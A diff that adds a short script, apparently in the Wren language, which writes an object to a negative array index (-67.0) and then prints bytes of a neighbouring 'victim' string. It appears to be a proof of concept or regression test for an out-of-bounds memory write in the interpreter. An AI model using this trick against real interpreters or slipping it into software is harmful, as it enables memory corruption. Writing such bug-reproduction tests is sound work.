@@ -1,0 +1,10 @@
+var victim = "1234567812345678"
+var array = [3.0,2.0,3.0,4.0]
+var obj = "1234"
+array[-67.0]=obj
+System.print(victim[8])
+System.print(victim[9])
+System.print(victim[10])
+System.print(victim[11])
+System.print(victim[12])
+System.print(victim[13])
